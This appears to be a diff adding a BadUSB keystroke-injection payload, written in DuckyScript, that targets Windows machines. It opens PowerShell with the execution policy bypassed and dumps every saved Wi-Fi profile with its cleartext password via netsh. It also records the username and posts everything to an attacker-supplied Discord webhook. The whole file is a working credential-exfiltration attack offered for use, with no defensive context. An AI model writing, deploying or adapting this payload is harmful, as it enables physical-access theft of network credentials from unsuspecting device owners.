@@ -1,0 +1,74 @@
+REM Open PowerShell normally
+GUI r
+DELAY 300
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 500
+
+REM Discord webhook URL
+STRING $discordWebhook = "<Webhookurl>"
+ENTER
+DELAY 100
+
+REM Get the device's name
+REM Get the device name or username
+STRING $deviceName = whoami
+ENTER
+DELAY 100
+
+REM Get all saved WiFi profile
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+ENTER
+DELAY 100
+STRING ($_ -split ":")[1].Trim()
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+
+REM Build the output message
+STRING $output = ""
+ENTER
+DELAY 100
+STRING foreach ($profile in $profiles) {
+ENTER
+DELAY 100
+STRING $output += "Wi-Fi Profile: $profile`n"
+ENTER
+DELAY 100
+STRING $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object {
+ENTER
+DELAY 100
+STRING ($_ -split ":")[1].Trim()
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING $output += "Password: $key`n`n"
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 500
+
+REM JSON payload for Discord webhook
+STRING $jsonPayload = @{
+ENTER
+DELAY 100
+STRING content = "Here are the Wi-Fi profiles and passwords on device $(whoami):`n`n$output"
+ENTER
+DELAY 100
+STRING } | ConvertTo-Json -Depth 10
+ENTER
+DELAY 500
+
+REM Send the data to the Discord webhook
+STRING Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $jsonPayload
+ENTER
+DELAY 500
+
+REM Exit PowerShell
+STRING exit
+ENTER
